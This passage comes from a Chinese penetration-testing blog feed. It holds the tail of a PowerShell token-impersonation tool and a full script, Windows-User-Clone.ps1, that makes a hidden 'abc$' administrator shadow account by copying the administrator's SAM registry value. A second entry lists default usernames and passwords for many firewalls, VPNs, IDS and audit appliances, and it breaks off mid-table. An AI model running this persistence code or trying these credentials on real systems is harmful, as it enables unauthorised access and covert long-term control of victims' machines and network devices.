punctuation">}</span>        <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$PsCmdlet</span><span class="token punctuation">.</span>ParameterSetName <span class="token operator">-</span>ieq <span class="token string">"CreateProcess"</span> <span class="token operator">-or</span> <span class="token variable">$PsCmdlet</span><span class="token punctuation">.</span>ParameterSetName <span class="token operator">-</span>ieq <span class="token string">"ImpersonateUser"</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$AllTokens</span> = Enum<span class="token operator">-</span>AllTokens            <span class="token comment" spellcheck="true">#Select the token to use</span>            <span class="token namespace">[IntPtr]</span><span class="token variable">$hToken</span> = <span class="token namespace">[IntPtr]</span>::Zero            <span class="token variable">$UniqueTokens</span> = <span class="token punctuation">(</span>Get<span class="token operator">-</span>UniqueTokens <span class="token operator">-</span>AllTokens <span class="token variable">$AllTokens</span><span class="token punctuation">)</span><span class="token punctuation">.</span>TokenByUser            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Username</span> <span class="token operator">-ne</span> <span class="token variable">$null</span> <span class="token operator">-and</span> <span class="token variable">$Username</span> <span class="token operator">-ne</span> <span class="token string">''</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$UniqueTokens</span><span class="token punctuation">.</span>ContainsKey<span class="token punctuation">(</span><span class="token variable">$Username</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token variable">$hToken</span> = <span class="token variable">$UniqueTokens</span><span class="token punctuation">[</span><span class="token variable">$Username</span><span class="token punctuation">]</span><span class="token punctuation">.</span>hToken                    <span class="token function">Write-Verbose</span> <span class="token string">"Selecting token by username"</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    <span class="token function">Write-Error</span> <span class="token string">"A token belonging to the specified username was not found. Username:<span class="token function"> $<span class="token punctuation">(</span><span class="token variable">$Username</span><span class="token punctuation">)</span></span>"</span> <span class="token operator">-</span>ErrorAction Stop                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">elseif</span> <span class="token punctuation">(</span> <span class="token variable">$ProcessId</span> <span class="token operator">-ne</span> <span class="token variable">$null</span> <span class="token operator">-and</span> <span class="token variable">$ProcessId</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Token</span> in <span class="token variable">$AllTokens</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$Token</span> <span class="token punctuation">|</span> <span class="token function">Get-Member</span> ProcessId<span class="token punctuation">)</span> <span class="token operator">-and</span> <span class="token variable">$Token</span><span class="token punctuation">.</span>ProcessId <span class="token operator">-eq</span> <span class="token variable">$ProcessId</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        <span class="token variable">$hToken</span> = <span class="token variable">$Token</span><span class="token punctuation">.</span>hToken                        <span class="token function">Write-Verbose</span> <span class="token string">"Selecting token by ProcessID"</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hToken</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token function">Write-Error</span> <span class="token string">"A token belonging to ProcessId<span class="token function"> $<span class="token punctuation">(</span><span class="token variable">$ProcessId</span><span class="token punctuation">)</span></span> could not be found. Either the process doesn't exist or it is a protected process and cannot be opened."</span> <span class="token operator">-</span>ErrorAction Stop                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$ThreadId</span> <span class="token operator">-ne</span> <span class="token variable">$null</span> <span class="token operator">-and</span> <span class="token variable">$ThreadId</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Token</span> in <span class="token variable">$AllTokens</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$Token</span> <span class="token punctuation">|</span> <span class="token function">Get-Member</span> ThreadId<span class="token punctuation">)</span> <span class="token operator">-and</span> <span class="token variable">$Token</span><span class="token punctuation">.</span>ThreadId <span class="token operator">-eq</span> <span class="token variable">$ThreadId</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        <span class="token variable">$hToken</span> = <span class="token variable">$Token</span><span class="token punctuation">.</span>hToken                        <span class="token function">Write-Verbose</span> <span class="token string">"Selecting token by ThreadId"</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hToken</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token function">Write-Error</span> <span class="token string">"A token belonging to ThreadId<span class="token function"> $<span class="token punctuation">(</span><span class="token variable">$ThreadId</span><span class="token punctuation">)</span></span> could not be found. Either the thread doesn't exist or the thread is in a protected process and cannot be opened."</span> <span class="token operator">-</span>ErrorAction Stop                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$Process</span> <span class="token operator">-ne</span> <span class="token variable">$null</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Token</span> in <span class="token variable">$AllTokens</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$Token</span> <span class="token punctuation">|</span> <span class="token function">Get-Member</span> ProcessId<span class="token punctuation">)</span> <span class="token operator">-and</span> <span class="token variable">$Token</span><span class="token punctuation">.</span>ProcessId <span class="token operator">-eq</span> <span class="token variable">$Process</span><span class="token punctuation">.</span>Id<span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        <span class="token variable">$hToken</span> = <span class="token variable">$Token</span><span class="token punctuation">.</span>hToken                        <span class="token function">Write-Verbose</span> <span class="token string">"Selecting token by Process object"</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hToken</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token function">Write-Error</span> <span class="token string">"A token belonging to Process<span class="token function"> $<span class="token punctuation">(</span><span class="token variable">$Process</span><span class="token punctuation">.</span>Name<span class="token punctuation">)</span></span> ProcessId<span class="token function"> $<span class="token punctuation">(</span><span class="token variable">$Process</span><span class="token punctuation">.</span>Id<span class="token punctuation">)</span></span> could not be found. Either the process doesn't exist or it is a protected process and cannot be opened."</span> <span class="token operator">-</span>ErrorAction Stop                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token function">Write-Error</span> <span class="token string">"Must supply a Username, ProcessId, ThreadId, or Process object"</span>  <span class="token operator">-</span>ErrorAction Stop            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">#Use the token for the selected action</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$PsCmdlet</span><span class="token punctuation">.</span>ParameterSetName <span class="token operator">-</span>ieq <span class="token string">"CreateProcess"</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$NoUI</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token function">Set</span><span class="token operator">-</span>DesktopACLs                <span class="token punctuation">}</span>                Create<span class="token operator">-</span>ProcessWithToken <span class="token operator">-</span>hToken <span class="token variable">$hToken</span> <span class="token operator">-</span>ProcessName <span class="token variable">$CreateProcess</span> <span class="token operator">-</span>ProcessArgs <span class="token variable">$ProcessArgs</span> <span class="token operator">-</span>PassThru:<span class="token variable">$PassThru</span>                Invoke<span class="token operator">-</span>RevertToSelf            <span class="token punctuation">}</span>            <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$ImpersonateUser</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                Invoke<span class="token operator">-</span>ImpersonateUser <span class="token operator">-</span>hToken <span class="token variable">$hToken</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>                <span class="token function">Write-Output</span> <span class="token string">"Running As:<span class="token function"> $<span class="token punctuation">(</span><span class="token namespace">[Environment]</span>::UserDomainName<span class="token punctuation">)</span></span><span class="token function">\$<span class="token punctuation">(</span><span class="token namespace">[Environment]</span>::UserName<span class="token punctuation">)</span></span>"</span>            <span class="token punctuation">}</span>            Free<span class="token operator">-</span>AllTokens <span class="token operator">-</span>TokenInfoObjs <span class="token variable">$AllTokens</span>        <span class="token punctuation">}</span>        <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$PsCmdlet</span><span class="token punctuation">.</span>ParameterSetName <span class="token operator">-</span>ieq <span class="token string">"WhoAmI"</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">Write-Output</span> <span class="token string"><span class="token function">"$<span class="token punctuation">(</span><span class="token namespace">[Environment]</span>::UserDomainName<span class="token punctuation">)</span></span><span class="token function">\$<span class="token punctuation">(</span><span class="token namespace">[Environment]</span>::UserName<span class="token punctuation">)</span></span>"</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token comment" spellcheck="true">#Enumerate tokens</span>        <span class="token punctuation">{</span>            <span class="token variable">$AllTokens</span> = Enum<span class="token operator">-</span>AllTokens            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$PsCmdlet</span><span class="token punctuation">.</span>ParameterSetName <span class="token operator">-</span>ieq <span class="token string">"ShowAll"</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token function">Write-Output</span> <span class="token variable">$AllTokens</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token function">Write-Output</span> <span class="token punctuation">(</span>Get<span class="token operator">-</span>UniqueTokens <span class="token operator">-</span>AllTokens <span class="token variable">$AllTokens</span><span class="token punctuation">)</span><span class="token punctuation">.</span>TokenByUser<span class="token punctuation">.</span>Values            <span class="token punctuation">}</span>            Invoke<span class="token operator">-</span>RevertToSelf            Free<span class="token operator">-</span>AllTokens <span class="token operator">-</span>TokenInfoObjs <span class="token variable">$AllTokens</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">#Start the main function</span>    Main<span class="token punctuation">}</span></code></pre><p>Windows-User-Clone.ps1脚本内容如下所示：</p><pre class=" language-powershell"><code class="language-powershell"><span class="token keyword">function</span> Create<span class="token operator">-</span>Clone<span class="token punctuation">{</span><span class="token comment" spellcheck="true">&lt;#.SYNOPSISThis script requires System privileges. You can use Invoke-TokenManipulation.ps1 to get System privileges and create the clone user.Link: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1Author: Evilcg and 3gstuentEvilcg's way to achieve the same goal:https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Create-Clone.ps1.PARAMETER uThe clone username.PARAMETER pThe clone user's password.PARAMETER cuThe user to be cloned, default administrator .EXAMPLECreate-Clone -u abc -p abc123 -cu administrator#></span>     <span class="token keyword">Param</span><span class="token punctuation">(</span>        <span class="token namespace">[Parameter(Mandatory=$true)]</span>        <span class="token namespace">[String]</span>        <span class="token variable">$u</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory=$true)]</span>        <span class="token namespace">[String]</span>        <span class="token variable">$p</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory=$false)]</span>        <span class="token namespace">[String]</span>        <span class="token variable">$cu</span> = <span class="token string">"administrator"</span>    <span class="token punctuation">)</span>    <span class="token keyword">function</span> Create<span class="token operator">-</span>user <span class="token punctuation">(</span><span class="token namespace">[string]</span><span class="token variable">$Username</span><span class="token punctuation">,</span><span class="token namespace">[string]</span><span class="token variable">$Password</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>        <span class="token variable">$group</span> = <span class="token string">"Administrators"</span>        <span class="token variable">$adsi</span> = <span class="token namespace">[ADSI]</span><span class="token string">"WinNT://<span class="token variable">$env</span>:COMPUTERNAME"</span>        <span class="token variable">$existing</span> = <span class="token variable">$adsi</span><span class="token punctuation">.</span>Children <span class="token punctuation">|</span> where <span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">.</span>SchemaClassName <span class="token operator">-eq</span> <span class="token string">'user'</span> <span class="token operator">-and</span> <span class="token variable">$_</span><span class="token punctuation">.</span>Name <span class="token operator">-eq</span> <span class="token variable">$Username</span> <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$existing</span> <span class="token operator">-eq</span> <span class="token variable">$null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">Write-Host</span> <span class="token string">"Creating new local user <span class="token variable">$Username</span> with password <span class="token variable">$Password</span>"</span>            &amp; NET USER <span class="token variable">$Username</span> <span class="token variable">$Password</span> <span class="token operator">/</span>add <span class="token operator">/</span>y <span class="token operator">/</span>expires:never <span class="token punctuation">|</span> <span class="token function">Out-Null</span>            <span class="token function">Write-Host</span> <span class="token string">"Adding local user <span class="token variable">$Username</span> to <span class="token variable">$group</span>."</span>            &amp; NET LOCALGROUP <span class="token variable">$group</span> <span class="token variable">$Username</span> <span class="token operator">/</span>add <span class="token punctuation">|</span> <span class="token function">Out-Null</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">Write-Host</span> <span class="token string">"[*] Setting password for existing local user <span class="token variable">$Username</span>"</span>            <span class="token variable">$existing</span><span class="token punctuation">.</span>SetPassword<span class="token punctuation">(</span><span class="token variable">$Password</span><span class="token punctuation">)</span>                   <span class="token punctuation">}</span>        <span class="token function">Write-Host</span> <span class="token string">"[*] Ensuring password for <span class="token variable">$Username</span> never expires"</span>        WMIC USERACCOUNT WHERE <span class="token string">"Name='<span class="token variable">$Username</span>'"</span> <span class="token function">SET</span> PasswordExpires=FALSE    <span class="token punctuation">}</span>    <span class="token keyword">function</span> GetUser<span class="token operator">-</span>Key<span class="token punctuation">(</span><span class="token namespace">[string]</span><span class="token variable">$user</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        cmd <span class="token operator">/</span>c <span class="token string">"regedit /e <span class="token variable">$env</span>:temp\<span class="token variable">$user</span>.reg "</span>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\<span class="token variable">$user</span><span class="token string">""</span>        <span class="token variable">$file</span> = <span class="token function">Get-Content</span> <span class="token string">"<span class="token variable">$env</span>:temp\<span class="token variable">$user</span>.reg"</span>  <span class="token punctuation">|</span> <span class="token function">Out-String</span>        <span class="token variable">$pattern</span>=<span class="token string">"@=hex\((.*?)\)\:"</span>        <span class="token variable">$file</span> <span class="token operator">-match</span> <span class="token variable">$pattern</span> <span class="token punctuation">|</span><span class="token function">Out-Null</span>        <span class="token variable">$key</span> = <span class="token string">"00000"</span><span class="token operator">+</span><span class="token variable">$matches</span><span class="token punctuation">[</span>1<span class="token punctuation">]</span>        <span class="token function">Write-Host</span> <span class="token variable">$key</span>        <span class="token keyword">return</span> <span class="token variable">$key</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> Clone <span class="token punctuation">(</span><span class="token namespace">[string]</span><span class="token variable">$ukey</span><span class="token punctuation">,</span><span class="token namespace">[string]</span><span class="token variable">$cukey</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>        <span class="token variable">$ureg</span> = <span class="token string">"HKLM:\SAM\SAM\Domains\Account\Users\<span class="token variable">$ukey</span>"</span> <span class="token punctuation">|</span><span class="token function">Out-String</span>        <span class="token variable">$cureg</span> = <span class="token string">"HKLM:\SAM\SAM\Domains\Account\Users\<span class="token variable">$cukey</span>"</span> <span class="token punctuation">|</span><span class="token function">Out-String</span>               <span class="token variable">$cuFreg</span> = <span class="token function">Get-Item</span> <span class="token operator">-</span>Path <span class="token variable">$cureg</span><span class="token punctuation">.</span>Trim<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token variable">$cuFvalue</span> = <span class="token variable">$cuFreg</span><span class="token punctuation">.</span>GetValue<span class="token punctuation">(</span><span class="token string">'F'</span><span class="token punctuation">)</span>        <span class="token function">Set-ItemProperty</span> <span class="token operator">-</span>path <span class="token variable">$ureg</span><span class="token punctuation">.</span>Trim<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token operator">-</span>Name <span class="token string">"F"</span> <span class="token operator">-</span>value <span class="token variable">$cuFvalue</span>        <span class="token variable">$outreg</span> = <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\<span class="token variable">$ukey</span>"</span>        cmd <span class="token operator">/</span>c <span class="token string">"regedit /e <span class="token variable">$env</span>:temp\out.reg <span class="token variable">$outreg</span>.Trim()"</span>        <span class="token function">Write-Host</span> <span class="token string">"Copy from <span class="token variable">$cu</span> to <span class="token variable">$u</span> success."</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> Main <span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>        <span class="token function">Write-Host</span> <span class="token string">"[*] Current token: "</span>  <span class="token operator">-</span>NoNewline        <span class="token variable">$token</span>=whoami        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span> <span class="token operator">-ne</span> <span class="token string">"nt authority\system"</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">Write-Host</span> <span class="token string">"  "</span> <span class="token variable">$token</span>            <span class="token function">Write-Host</span> <span class="token string">"[!] Low privileges."</span>            <span class="token function">Write-Host</span> <span class="token string">"[*] Exit."</span>            <span class="token keyword">Exit</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>         <span class="token punctuation">{</span>            <span class="token function">Write-Host</span> <span class="token variable">$token</span>        <span class="token punctuation">}</span>        <span class="token function">Write-Host</span> <span class="token string">"[*] Create User..."</span>        Create<span class="token operator">-</span>user <span class="token variable">$u</span> <span class="token variable">$p</span>        <span class="token function">Write-Host</span> <span class="token string">"[*] Get User <span class="token variable">$u</span>'s Key: "</span>  <span class="token operator">-</span>NoNewline        <span class="token variable">$ukey</span> = GetUser<span class="token operator">-</span>Key <span class="token variable">$u</span> <span class="token punctuation">|</span><span class="token function">Out-String</span>        <span class="token function">Write-Host</span> <span class="token string">"[*] Get User <span class="token variable">$cu</span>'s Key: "</span>  <span class="token operator">-</span>NoNewline        <span class="token variable">$cukey</span> = GetUser<span class="token operator">-</span>Key <span class="token variable">$cu</span> <span class="token punctuation">|</span><span class="token function">Out-String</span>        <span class="token function">Write-Host</span> <span class="token string">"[*] Try to clone..."</span>        Clone <span class="token variable">$ukey</span> <span class="token variable">$cukey</span>        <span class="token function">Write-Host</span> <span class="token string">"[*] Delete User:<span class="token variable">$u</span>"</span>        Net User <span class="token variable">$u</span> <span class="token operator">/</span><span class="token function">del</span> <span class="token punctuation">|</span><span class="token function">Out-Null</span>        <span class="token function">Write-Host</span> <span class="token string">"[*] Import the registry"</span>        cmd <span class="token operator">/</span>c <span class="token string">"regedit /s <span class="token variable">$env</span>:temp\<span class="token variable">$u</span>.reg"</span>        cmd <span class="token operator">/</span>c <span class="token string">"regedit /s <span class="token variable">$env</span>:temp\out.reg"</span>        <span class="token function">Write-Host</span> <span class="token string">"[*] Clearn"</span>        <span class="token function">Remove-Item</span> <span class="token variable">$env</span>:temp\<span class="token operator">*</span><span class="token punctuation">.</span>reg        <span class="token function">Write-Output</span> <span class="token string">"[*] All Done."</span>    <span class="token punctuation">}</span>        Main   <span class="token punctuation">}</span>Create<span class="token operator">-</span>Clone <span class="token operator">-</span>u abc$ <span class="token operator">-</span>p 123</code></pre><h1 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h1><ul><li><a href="https://baike.baidu.com/item/%E5%BD%B1%E5%AD%90%E5%B8%90%E6%88%B7/11044984?fromtitle=%E5%BD%B1%E5%AD%90%E8%B4%A6%E6%88%B7&fromid=23689426&fr=aladdin" target="_blank" rel="noopener">影子账户</a></li><li><a href="https://www.k2zone.cn/?p=642" target="_blank" rel="noopener">Windows提权建立Administrator的影子账户</a></li><li><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/" target="_blank" rel="noopener">渗透技巧——Windows系统的帐户隐藏</a></li><li><a href="https://blog.csdn.net/flyliuweisky547/article/details/18565705" target="_blank" rel="noopener">PowerShell如何使用自定义公共函数</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后渗透 </tag>
            
            <tag> 权限维持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见设备默认密码整理</title>
      <link href="/2020/11/26/chang-jian-she-bei-mo-ren-mi-ma-zheng-li/"/>
      <url>/2020/11/26/chang-jian-she-bei-mo-ren-mi-ma-zheng-li/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">设备</th><th align="center">默认账号</th><th align="center">默认密码</th></tr></thead><tbody><tr><td align="center">深信服产品</td><td align="center"><code>sangfor</code></td><td align="center"><code>sangfor/sangfor@2018/sangfor@2019</code></td></tr><tr><td align="center">深信服科技AD</td><td align="center"><code>sangfor</code></td><td align="center"><code>dianrecover</code></td></tr><tr><td align="center">深信服负载均衡AD 3.6</td><td align="center"><code>admin</code></td><td align="center"><code>admin</code></td></tr><tr><td align="center">深信服WAC（WNS v2.6）</td><td align="center"><code>admin</code></td><td align="center"><code>admin</code></td></tr><tr><td align="center">深信服v-p-n</td><td align="center"><code>Admin</code></td><td align="center"><code>Admin</code></td></tr><tr><td align="center">深信服ipsec-V-P-N（SSL 5.5）</td><td align="center"><code>Admin</code></td><td align="center"><code>Admin</code></td></tr><tr><td align="center">深信服AC6.0</td><td align="center"><code>admin</code></td><td align="center"><code>admin</code></td></tr><tr><td align="center">SANGFOR防火墙</td><td align="center"><code>admin</code></td><td align="center"><code>sangfor</code></td></tr><tr><td align="center">深信服AF（NGAF v2.2）</td><td align="center"><code>admin</code></td><td align="center"><code>sangfor</code></td></tr><tr><td align="center">深信服NGAF喜爱一道应用防火墙（NGAF v4.3）</td><td align="center"><code>admin</code></td><td align="center"><code>admin</code></td></tr><tr><td align="center">深信服AD3.9</td><td align="center"><code>admin</code></td><td align="center"><code>admin</code></td></tr><tr><td align="center">深信服上网行为管理设备数据中心</td><td align="center"><code>Admin</code></td><td align="center">密码为空</td></tr><tr><td align="center">SANGFOR_AD_v5.1</td><td align="center"><code>admin</code></td><td align="center"><code>admin</code></td></tr><tr><td align="center">网御漏洞扫描系统</td><td align="center"><code>leadsec</code></td><td align="center"><code>leadsec</code></td></tr><tr><td align="center">天阗入侵检测与管理系统 v7.0</td><td align="center"><code>Admin</code></td><td align="center"><code>venus70</code></td></tr><tr><td align="center"></td><td align="center"><code>Audit</code></td><td align="center"><code>venus70</code></td></tr><tr><td align="center"></td><td align="center"><code>adm</code></td><td align="center"><code>venus70</code></td></tr><tr><td align="center">天阗入侵检测与管理系统 v6.0</td><td align="center"><code>Admin</code></td><td align="center"><code>venus60</code></td></tr><tr><td align="center"></td><td align="center"><code>audit</code></td><td align="center"><code>venus60</code></td></tr><tr><td align="center"></td><td align="center"><code>adm</code></td><td align="center"><code>venus60</code></td></tr><tr><td align="center">网御WAF集中控制中心（v3.0R5.0）</td><td align="center"><code>admin</code></td><td align="center"><code>leadsec.waf</code></td></tr><tr><td align="center"></td><td align="center"><code>audit</code></td><td align="center"><code>leadsec.waf</code></td></tr><tr><td align="center"></td><td align="center"><code>adm</code></td><td align="center"><code>leadsec.waf</code></td></tr><tr><td align="center">联想网御</td><td align="center"><code>administrator</code></td><td align="center"><code>administrator</code></td></tr><tr><td align="center">网御事件服务器</td><td align="center"><code>admin</code></td><td align="center"><code>admin123</code></td></tr><tr><td align="center">联想网御防火墙PowerV</td><td align="center"><code>administrator</code></td><td align="center"><code>administrator</code></td></tr><tr><td align="center">联想网御入侵检测系统</td><td align="center"><code>lenovo</code></td><td align="center"><code>default</code></td></tr><tr><td align="center">网络卫士入侵检测系统</td><td align="center"><code>admin</code></td><td align="center"><code>talent</code></td></tr><tr><td align="center">网御入侵检测系统v3.2.72.0</td><td align="center"><code>adm</code></td><td align="center"><code>leadsec32</code></td></tr><tr><td align="center"></td><td align="center"><code>admin</code></td><td align="center"><code>leadsec32</code></td></tr><tr><td align="center">联想网御入侵检测系统IDS</td><td align="center"><code>root</code></td><td align="center"><code>111111</code></td></tr><tr><td align="center"></td><td align="center"><code>admin</code></td><td align="center"><code>admin123</code></td></tr><tr><td align="center">科来网络回溯分析系统</td><td align="center"><code>csadmin</code></td><td align="center"><code>colasoft</code></td></tr><tr><td align="center">中控考勤机web3.0</td><td align="center"><code>administrator</code></td><td align="center"><code>123456</code></td></tr><tr><td align="center">H3C iMC</td><td align="center"><code>admin</code></td><td align="center"><code>admin</code></td></tr><tr><td align="center">H3C SecurityPath系列</td><td align="center"><code>admin</code></td><td align="center"><code>admin</code></td></tr><tr><td align="center">H3C S5120-SI</td><td align="center"><code>test</code></td><td align="center"><code>123</code></td></tr><tr><td align="center">H3C 智能管理中心</td><td align="center"><code>admin</code></td><td align="center"><code>admin</code></td></tr><tr><td align="center">H3C ER3100</td><td align="center"><code>admin</code></td><td align="center"><code>admin3100</code></td></tr><tr><td align="center">H3C ER3200</td><td align="center"><code>admin</code></td><td align="center"><code>admin3200</code></td></tr><tr><td align="center">H3C ER3260</td><td align="center"><code>admin</code></td><td align="center"><code>admin3260</code></td></tr><tr><td align="center">H3C</td><td align="center"><code>admin</code></td><td align="center"><code>adminer</code></td></tr><tr><td align="center"></td><td align="center"><code>admin</code></td><td align="center"><code>admin</code></td></tr><tr><td align="center"></td><td align="center"><code>admin</code></td><td align="center"><code>h3capadmin</code></td></tr><tr><td align="center"></td><td align="center"><code>h3c</code></td><td align="center"><code>h3c</code></td></tr><tr><td align="center">360天擎</td><td align="center"><code>admin</code></td><td align="center"><code>admin</code></td></tr><tr><td align="center">网神防火墙</td><td align="center"><code>firewall</code></td><td align="center"><code>firewall</code></td></tr><tr><td align="center">天融信防火墙NGFW4000</td><td align="center"><code>superman</code></td><td align="center"><code>talent</code></td></tr><tr><td align="center">黑盾防火墙</td><td align="center"><code>admin</code></td><td align="center"><code>admin</code></td></tr><tr><td align="center"></td><td align="center"><code>rule</code></td><td align="center"><code>abc123</code></td></tr><tr><td align="center"></td><td align="center"><code>audit</code></td><td align="center"><code>abc123</code></td></tr><tr><td align="center">华为防火墙</td><td align="center"><code>telnetuser</code></td><td align="center"><code>telnetpwd</code></td></tr><tr><td align="center"></td><td align="center"><code>ftpuser</code></td><td align="center"><code>ftppwd</code></td></tr><tr><td align="center">方正防火墙</td><td align="center"><code>admin</code></td><td align="center"><code>admin</code></td></tr><tr><td align="center">飞塔防火墙</td><td align="center"><code>admin</code></td><td align="center">密码为空</td></tr><tr><td align="center">Juniper_SSG_5防火墙</td><td align="center"><code>netscreen</code></td><td align="center"><code>netscreen</code></td></tr><tr><td align="center">中新金盾硬件防火墙</td><td align="center"><code>admin</code></td><td align="center"><code>123</code></td></tr><tr><td align="center">kill防火墙（冠群金辰）</td><td align="center"><code>admin</code></td><td align="center"><code>sys123</code></td></tr><tr><td align="center">天清汉马USG防火墙</td><td align="center"><code>admin</code></td><td align="center"><code>venus.fw</code></td></tr><tr><td align="center"></td><td align="center"><code>Audit</code></td><td align="center"><code>venus.audit</code></td></tr><tr><td align="center"></td><td align="center"><code>useradmin</code></td><td align="center"><code>venus.audit</code></td></tr><tr><td align="center">阿姆瑞特防火墙</td><td align="center"><code>admin</code></td><td align="center"><code>manager</code></td></tr><tr><td align="center">山石网科</td><td align="center"><code>hillstone</code></td><td align="center"><code>hillstone</code></td></tr><tr><td align="center">绿盟安全审计系统</td><td align="center"><code>weboper</code></td><td align="center"><code>weboper</code></td></tr><tr><td align="center"></td><td align="center"><code>webaudit</code></td><td align="center"><code>webaudit</code></td></tr><tr><td align="center"></td><td align="center"><code>conadmin</code></td><td align="center"><code>conadmin</code></td></tr><tr><td align="center"></td><td align="center"><code>admin</code></td><td align="center"><code>admin</code></td></tr><tr><td align="center"></td><td align="center"><code>shell</code></td><td align="center"><code>shell</code></td></tr><tr><td align="center">绿盟产品</td><td align="center"></td><td align="center"><code>nsfocus123</code></td></tr><tr><td align="center">TopAudit日志审计系统</td><td align="center"><code>superman</code></td><td align="center"><code>talnet</code></td></tr><tr><td align="center">LogBase日志管理综合审计系统</td><td align="center"><code>admin</code></td><td align="center"><code>safetybase</code></td></tr><tr><td align="center">网神SecFox运维安全管理与审计系统</td><td align="center"><code>admin</code></td><td align="center"><code>!1fw@2soc#3v-p-n</code></td></tr><tr><td align="center">天融信数据库审计系统</td><td align="center"><code>superman</code></td><td align="center"><code>telnet</code></td></tr><tr><td align="center">Hillstone安全审计平台</td><td 